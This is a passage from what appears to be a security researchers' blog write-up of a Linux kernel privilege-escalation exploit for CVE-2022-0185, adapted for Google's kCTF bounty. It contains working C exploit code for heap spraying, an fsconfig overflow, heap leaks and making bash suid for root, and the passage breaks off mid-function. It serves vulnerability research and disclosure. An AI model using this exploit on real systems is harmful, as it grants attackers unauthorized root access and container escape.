    </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">if</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> ((mmap((</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">void</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> *)</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x1338000</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x1000</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, evil_fd, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">)) != (</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">void</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> *)</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x1338000</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">)
    {
        perror(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"mmap fail fuse 1"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
        </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">exit</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">-1</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    }

    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">pthread_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> thread;
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> race = pthread_create(&amp;thread, </span><span class="hljs-literal" style="color: #a31515; font-family: monospace; white-space: pre;">NULL</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, arb_write, </span><span class="hljs-literal" style="color: #a31515; font-family: monospace; white-space: pre;">NULL</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">if</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(race != </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">)
    {
        perror(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"can't setup threads for race"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    }
    send_msg(target, rooter, size - </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x30</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    pthread_join(thread, </span><span class="hljs-literal" style="color: #a31515; font-family: monospace; white-space: pre;">NULL</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    munmap((</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">void</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> *)</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x1337000</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x1000</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    munmap((</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">void</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> *)</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x1338000</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x1000</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    close(evil_fd);
    close(fd);
}</span></p></div><p>You can find the full link to our exploit here: <a href="https://github.com/Crusaders-of-Rust/CVE-2022-0185/blob/master/exploit_fuse.c">https://github.com/Crusaders-of-Rust/CVE-2022-0185/blob/master/exploit_fuse.c</a>; it can be 
easily adjusted for any kernel versions above 5.7, and the spray will 
need to be reworked for even older versions. Now with /bin/bash as suid,
 the exploit will finish. As any low privileged user with access to 
bash, one can just run it with the -p argument to achieve root 
privileges! All in all, a really simple (and reliable) exploit using 
techniques discovered in the CTF world.</p><p>Having an Ubuntu LPE is great and all, but what we really wanted to 
try was the Google kCTF VRP program for their bounty. The money would be
 great, and <del>an exploit in a hardened environment will be quite useful during CTFs.</del>
 They offered two challenges: kctf and fullchain. kctf is where you root
 the container to read the container&#8217;s root flag, and fullchain is where
 you root the container, escape to host, and then read the root flag of 
another container. Fullchain is the goal. </p><p>There were many issues early on. For one, the /dev folder was 
barebones, so fuse and other favorite kernel exploit structures like 
  <code>tty_struct</code> were unavailable. Userfaultfd was of course be 
disabled, and the kernel heap in the 4k slab seemed to have had many 
structures as well (the heap behaved more actively in this container 
environment in general for the slabs I targeted) - this required better 
spraying strategies to help with stability. </p><p>One more important issue is in regards to the <code>GFP_KERNEL_ACCOUNT</code> 
flag. Accounting flag is usually reserved for objects with data from 
userland - famous structures like <code>msg_msg</code> are all allocated with them. 
Before 5.9, the kernel placed accounted objects in separate slabs, but 
this only takes affect with the <code>CONFIG_MEMCG_KMEM</code> compilation option&#8230; 
another case of an upgrade making exploits easier.</p><p>How does the above issue affect our exploit? Shouldn&#8217;t the legacy 
data allocations also have the accounting flags based on its purpose in 
documentation? Well, it should, but it seems like kernel developers 
forgot about this until a <a href="https://github.com/torvalds/linux/commit/bb902cb47cf93b33cd92b3b7a4019330a03ef57f#diff-c4a9ea83de4a42a0d1bcbaf1f03ce35188f38da4987e0e7a52aae7f04de14a05">recent commit for 5.16</a>.
 This means that <code>msg_msg</code> would not be able to be abused on the kctf 
infrastructure Google hosted, which was on 5.4, and we would have to 
look for a new structure, either through a lot of source reading or 
CodeQL. We were lucky as it was around this time that an update for kctf
 was almost complete where Kubernetes running on a 5.10 kernel would be 
available (hence the creation of kctf.vrp2.ctfcompetition.com), so we 
just ended up targeting this one to save time.</p><p>Note that Starlabs managed to get it on the older kctf instance. I
 asked n0psledbyte afterwards about their approach - they managed to 
abuse <code>msg_msg</code> too by performing a cross cache overflow, an interesting 
concept I&#8217;ve never really thought about. grsecurity has an <a href="https://grsecurity.net/how_autoslab_changes_the_memory_unsafety_game">article</a> related to this strategy and I am curious how much spraying is required to achieve an acceptable reliability rate.</p><p>With limited abilities to control a race, we can&#8217;t exactly use 
<code>msg_msg</code> for arbitrary write. Our thoughts at this point were to either 
rely on the unlink primitive or arbitrary free primitive that <code>msg_msg</code> 
provides. Our end goal was to replace the <a href="https://elixir.bootlin.com/linux/v5.7/source/include/linux/pipe_fs_i.h#L21">pipe_buffer</a>
 pointer to a function table with a pointer to some other arbitrary 
msg_msg chunk, for us to gain ROP control. Thanks to articles from <a href="https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html">Andy Nguyen</a> and <a href="https://bsauce.github.io/2021/09/26/kernel-exploit-%E6%9C%89%E7%94%A8%E7%9A%84%E7%BB%93%E6%9E%84%E4%BD%93/">bsauce</a> for providing me with the <code>pipe_buffer</code> idea!</p><p>Before I discuss unlink or the arbitrary free primitive, I need to 
first discuss the heap spraying technique I used here to help with
 slab randomization on top of a busier heap, and the mechanism to which I
 achieved a heap leak.</p><p>A chat with D3v17 and this <a href="https://github.com/PaoloMonti42/salt/blob/master/docs/0x00_SLUB_refresher.md#slub">article</a>
 were pretty helpful for planning out the spray. As mentioned 
previously, the first thing I did was to force cpu affinity on one core,
 as each cpu has its own freelists. Some other tricks I did (I&#8217;m not 
sure if they actually do help as it might just be placebo, but when 
testing, they definitely increased exploit reliability) were the 
following - a lot of the spray related constants I used in the final 
exploit was specifically targeted towards the Kubernetes infrastructure:</p><ol>
<li>
<p>Pre-allocate a ton of chunks beforehand using <code>msg_msg</code> sprays. Then, 
after each stage of the exploit, or when trying to repeat a stage, I 
would trigger some of them to be freed. Hopefully, this covers up some 
of the corruption and prevents crashes on future allocations. All of 
these saved chunks would be dumped as well before triggering a root 
shell as a final &#8220;cleanup.&#8221;</p>
</li>
<li>
<p>Before performing overflows into <code>msg_msg</code> objects from <code>fsconfig</code>, I 
would allocate anywhere from 4 to 7 <code>msg_msg</code> objects (as there are only 8
 objects in a kmalloc-4k slab). I would then trigger a <code>MSG_COPY</code> on one 
of them, which would force an allocation and free in the same slab in the copy process. Hopefully, this would create a hole in the 
slab, and my next allocation of the legacy data region will go right on 
top of a <code>msg_msg</code> object.</p>
</li>
</ol><p>With this spray mechanism, I managed to easily achieve kernel leaks 
and heap leaks. For my heap leaks, I used that fact that each <code>msg_queue</code> 
connects their <code>msg_msg</code> objects together in a doubly linked list. If you 
allocate a kmalloc-64 <code>msg_msg</code> object between a kmalloc-512 object and a 
kmalloc-1k object in one queue, and allocate a kmalloc-4k <code>msg_msg</code> 
chained to a kmalloc-64 <code>msg_msgseg</code> object in another queue, you can abuse 
OOB read to leak out the kmalloc-512 and kmalloc-1k object addresses. 
Using kmalloc-512 isn&#8217;t necessarily required, it&#8217;s just what I chose and
 I didn&#8217;t bother changing it afterwards. The diagram below should help 
clarify this stage. </p><p>










</p><p>Heap Setup:</p><p></p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/a/AVvXsEhQxppxQVEFTI_8LvhYfn8UVvmerOlNEsAyQ4SILvl3a4dGeg-oONk-QVcrj5h5uYpymjwnDOUcY603sd-PjjqyS4bufe453DQtWcmoD9UW8mn8oXMJr2WwB7CULB6mn986c1QkCnqsIAWviAZUf9O3W8ZS7au5q0dkjUjO5IW_QHwyjLzH5_nwnzUXVg=s1094" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="588" data-original-width="1094" height="344" src="https://blogger.googleusercontent.com/img/a/AVvXsEhQxppxQVEFTI_8LvhYfn8UVvmerOlNEsAyQ4SILvl3a4dGeg-oONk-QVcrj5h5uYpymjwnDOUcY603sd-PjjqyS4bufe453DQtWcmoD9UW8mn8oXMJr2WwB7CULB6mn986c1QkCnqsIAWviAZUf9O3W8ZS7au5q0dkjUjO5IW_QHwyjLzH5_nwnzUXVg=w640-h344" width="640" /></a></div><br />&nbsp;Overflow into <code>m_ts</code> (size) to achieve OOB read on MSG_COPY:<p></p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/a/AVvXsEjBHPc32Ssq1tcbZBwjFaxSFqDSlfzdyEwsR5WdYd2FboUBFQ4NaSjyYwd89pvsnrUyQKmNDq71BTTIOICfKbKhL8_Vrt2vXzFZlLPW4zb20Cn95yTa2KclDX8odOBkwRIwdmKaRvdX4kuLiFdCpV60gdMlsY9V0jCIJnWnI4Wn4qTCxMnEvNMqvU_hwQ=s1115" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="604" data-original-width="1115" height="346" src="https://blogger.googleusercontent.com/img/a/AVvXsEjBHPc32Ssq1tcbZBwjFaxSFqDSlfzdyEwsR5WdYd2FboUBFQ4NaSjyYwd89pvsnrUyQKmNDq71BTTIOICfKbKhL8_Vrt2vXzFZlLPW4zb20Cn95yTa2KclDX8odOBkwRIwdmKaRvdX4kuLiFdCpV60gdMlsY9V0jCIJnWnI4Wn4qTCxMnEvNMqvU_hwQ=w640-h346" width="640" /></a></div><br /><p>You can also figure out which <code>msg_queue</code> those leaked addresses belonged 
to based on the contents in msg_msg data, so you can seletively free 
them and rely on LIFO to place objects there in advance. I replaced the 
  kmalloc-1k one with a <code>pipe_buffer</code> object while kmalloc-512 already had
 stack pivot gadgets ready.</p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/a/AVvXsEi-uVg41L4yTKo99UElvhQjmL57jY0YaWCKYZZCHCqwfjYpTfvKyCBbDe7yt0SFLvNdwi6xWnnjZP3lL_81sxZ8mjWqLAVCx-WCpwRQdmLNiBv0dkHrwSUM-xGxjew2yOSm56nEXe8TnE2Gmp_d3K1uHdIC43005moylzd1_RYjGjYNmMhKMTw_QAxJnQ=s1118" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="600" data-original-width="1118" height="344" src="https://blogger.googleusercontent.com/img/a/AVvXsEi-uVg41L4yTKo99UElvhQjmL57jY0YaWCKYZZCHCqwfjYpTfvKyCBbDe7yt0SFLvNdwi6xWnnjZP3lL_81sxZ8mjWqLAVCx-WCpwRQdmLNiBv0dkHrwSUM-xGxjew2yOSm56nEXe8TnE2Gmp_d3K1uHdIC43005moylzd1_RYjGjYNmMhKMTw_QAxJnQ=w640-h344" width="640" /></a></div><p>The following snippet code should lead to a heap leak:&nbsp;</p><div style="background-color: whitesmoke; display: block; max-width: 100%; overflow-x: auto;"><p><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">double_heap_leaks </span><span class="hljs-title function_" style="color: #a31515; font-family: monospace; white-space: pre;">do_heap_leaks</span><span class="hljs-params" style="font-family: monospace; white-space: pre;">()</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
{
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">uint64_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> kmalloc_1024 = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">uint64_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> kmalloc_512 = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">char</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> pivot_spray[</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x2000</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">] = {</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">};
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">uint64_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> *pivot_spray_ptr = (</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">uint64_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> *)pivot_spray;
    double_heap_leaks leaks = {</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">};
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> linked_msg[</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">256</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">] = {</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">};
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">char</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> pat[</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x1000</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">] = {</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">};
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">char</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> buffer[</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x2000</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">] = {</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">}, recieved[</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x2000</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">] = {</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">};
    msg *message = (msg *)buffer;

    </span><span class="hljs-comment" style="color: green; font-family: monospace; white-space: pre;">// spray kmalloc-512 linked to kmalloc-64 linked to kmalloc-1k in unique msg queues</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
    </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">for</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> i = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">; i &lt; </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">255</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">; i++) 
    {
        linked_msg[i] = make_queue(IPC_PRIVATE, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0666</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> | IPC_CREAT);
        </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">memset</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(pivot_spray, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">sizeof</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(pivot_spray));
        pivot_spray_ptr[</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">] = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">1</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;
        </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">for</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> i = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">; i &lt; </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">10</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;i ++)
        {
            pivot_spray_ptr[i+</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">1</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">] = stack_pivot;
        }

        </span><span class="hljs-comment" style="color: green; font-family: monospace; white-space: pre;">// spray pivots using kmalloc-512 allocations</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
        send_msg(linked_msg[i], pivot_spray, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x200</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> - </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x30</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
        </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">memset</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(buffer, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x1</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">+i, </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">sizeof</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(buffer));
        message-&gt;mtype = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">2</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;
        send_msg(linked_msg[i], message, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x40</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> - </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x30</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
        message-&gt;mtype = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">3</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;
        send_msg(linked_msg[i], message, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x400</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> - </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x30</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> - </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x40</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    }

    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> size = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x1038</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> targets[H_SPRAY] = {</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">};

    </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">for</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> i = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">; i &lt; H_SPRAY; i++) 
    {
        </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">memset</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(buffer, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x41</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">+i, </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">sizeof</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(buffer));
        targets[i] = make_queue(IPC_PRIVATE, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0666</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> | IPC_CREAT);
        send_msg(targets[i], message, size - </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x30</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    }

    </span><span class="hljs-comment" style="color: green; font-family: monospace; white-space: pre;">// create hole hopefully</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
    get_msg(targets[</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">], recieved, size, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);

    </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">puts</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"[*] Opening ext4 filesystem"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    fd = fsopen(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"ext4"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">if</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (fd &lt; </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">) 
    {
        </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">puts</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"fsopen: Remember to unshare"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
        </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">exit</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">-1</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    }

    </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">strcpy</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(pat, </span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">for</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> i = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">; i &lt; </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">117</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">; i++) 
    {
        fsconfig(fd, FSCONFIG_SET_STRING, </span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"\x00"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, pat, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    }

    </span><span class="hljs-comment" style="color: green; font-family: monospace; white-space: pre;">// fill it a bit to help prevent potential crashes on MSG_COPY</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
    stuff_4k(</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">16</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);

    </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">puts</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"[*] Overflowing..."</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    pat[</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">21</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">] = </span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">'\x00'</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">char</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> evil[] = </span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"\x60\x19"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;
    fsconfig(fd, FSCONFIG_SET_STRING, </span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"\x00"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, pat, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    fsconfig(fd, FSCONFIG_SET_STRING, </span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"\x00"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, evil, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">puts</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"[*] Done heap overflow"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);

    size = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x1960</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;
    </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">puts</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"[*] Receiving corrupted size and leak data"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    </span><span class="hljs-comment" style="color: green; font-family: monospace; white-space: pre;">// go through all targets qids and check if we hopefully get a leak</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
